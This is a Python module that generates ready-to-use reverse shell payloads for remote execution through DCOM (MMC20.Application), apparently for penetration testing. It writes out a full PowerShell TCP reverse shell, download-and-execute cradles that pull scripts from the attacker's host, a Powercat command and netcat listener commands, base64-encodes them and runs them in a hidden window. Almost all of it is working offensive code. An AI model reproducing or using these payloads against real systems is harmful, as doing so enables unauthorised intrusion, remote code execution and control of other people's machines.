"""Payload generator for reverse shells and DCOM commands."""
import base64
from typing import Optional, Dict, List
from dataclasses import dataclass


# Cache generated payloads (module-level for session persistence)
_payload_cache: Dict[str, str] = {}


@dataclass
class PayloadOption:
    """A generated payload option."""
    name: str
    description: str
    listener: str           # Command to start listener
    payload_raw: str        # Raw payload (for reference)
    payload_encoded: str    # Base64 encoded (for -e flag)
    dcom_command: str       # Complete DCOM execution command


class PayloadGenerator:
    """Generate multiple ready-to-use reverse shell payloads."""

    def __init__(self, lhost: Optional[str] = None, lport: Optional[int] = None):
        self.lhost = lhost or "<LHOST>"
        self.lport = str(lport) if lport else "<LPORT>"
        self._use_placeholders = lhost is None or lport is None

    @property
    def is_configured(self) -> bool:
        """Check if LHOST/LPORT are configured (not placeholders)."""
        return not self._use_placeholders

    def _encode_ps(self, payload: str) -> str:
        """Base64 encode PowerShell payload (UTF-16LE, strip BOM)."""
        cache_key = f"enc_{hash(payload)}"
        if cache_key in _payload_cache:
            return _payload_cache[cache_key]

        encoded = base64.b64encode(payload.encode('utf16')[2:]).decode()
        _payload_cache[cache_key] = encoded
        return encoded

    def get_all_payloads(self, target: str) -> List[PayloadOption]:
        """Generate all payload options for a target.

        Args:
            target: Target hostname or IP

        Returns:
            List of PayloadOption objects (uses placeholders if LHOST/LPORT not configured)
        """
        payloads = []

        # Option A: PowerShell TCP Reverse Shell (interactive PS prompt)
        ps_tcp = f'$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        ps_tcp_encoded = self._encode_ps(ps_tcp)
        payloads.append(PayloadOption(
            name="PowerShell TCP",
            description="Interactive PS prompt, most reliable",
            listener=f"rlwrap nc -lvnp {self.lport}",
            payload_raw=ps_tcp,
            payload_encoded=ps_tcp_encoded,
            dcom_command=f"$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e {ps_tcp_encoded}','7')",
        ))

        # Option B: PowerShell Download Cradle (hosts shell.ps1 on Kali)
        ps_cradle = f"IEX(New-Object Net.WebClient).DownloadString('http://{self.lhost}/shell.ps1')"
        ps_cradle_encoded = self._encode_ps(ps_cradle)
        payloads.append(PayloadOption(
            name="Download Cradle",
            description="Fetches shell.ps1 from Kali (needs web server)",
            listener=f"# 1. Create shell.ps1 with reverse shell\n# 2. sudo python3 -m http.server 80\n# 3. rlwrap nc -lvnp {self.lport}",
            payload_raw=ps_cradle,
            payload_encoded=ps_cradle_encoded,
            dcom_command=f"$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e {ps_cradle_encoded}','7')",
        ))

        # Option C: Powercat (download and execute)
        powercat = f"IEX(New-Object Net.WebClient).DownloadString('http://{self.lhost}/powercat.ps1');powercat -c {self.lhost} -p {self.lport} -e powershell"
        powercat_encoded = self._encode_ps(powercat)
        payloads.append(PayloadOption(
            name="Powercat",
            description="Requires powercat.ps1 on web server",
            listener=f"rlwrap nc -lvnp {self.lport}",
            payload_raw=powercat,
            payload_encoded=powercat_encoded,
            dcom_command=f"$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e {powercat_encoded}','7')",
        ))

        return payloads

    def get_dcom_instantiate(self, target: str) -> str:
        """Get DCOM object instantiation command.

        Args:
            target: Target hostname or IP

        Returns:
            PowerShell command to instantiate DCOM object
        """
        return f"$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','{target}'))"

    def get_listener_command(self) -> str:
        """Get netcat listener command."""
        return f"rlwrap nc -lvnp {self.lport}"
